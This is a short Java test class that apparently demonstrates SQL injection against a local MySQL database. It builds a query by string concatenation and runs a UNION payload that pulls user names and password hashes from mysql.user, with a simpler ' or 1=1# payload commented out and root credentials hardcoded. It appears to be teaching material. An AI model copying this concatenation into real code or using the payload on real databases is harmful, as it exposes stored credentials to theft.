package test;

import model.User;
import org.apache.commons.dbutils.QueryRunner;
import org.apache.commons.dbutils.handlers.BeanListHandler;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.List;

/*
*@ClassName:SqlInjectTest
 @Description:TODO
 @Author:
 @Date:2018/8/21 14:11 
 @Version:v1.0
*/
public class SqlInjectTest {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        //获取连接
        //获取连接
        Class.forName("com.mysql.jdbc.Driver");
        Connection connection = DriverManager.getConnection("jdbc:mysql://localhost:3306/school", "root", "123456");
        //执行查询
        QueryRunner queryRunner = new QueryRunner();

        String sql="select * from user where name='" ;
        //String name="abc";
        //String name="' or 1=1#";
        String name="' or 1=1 union select 1,user,password  from mysql.user#";
        //拼接完成的sql
        sql=sql+name+"'";
        System.out.println(sql);
        List<User> userList = queryRunner.query(connection, sql, new BeanListHandler<User>(User.class));
        for (User user :
                userList) {
            System.out.println(user);
        }


    }
}
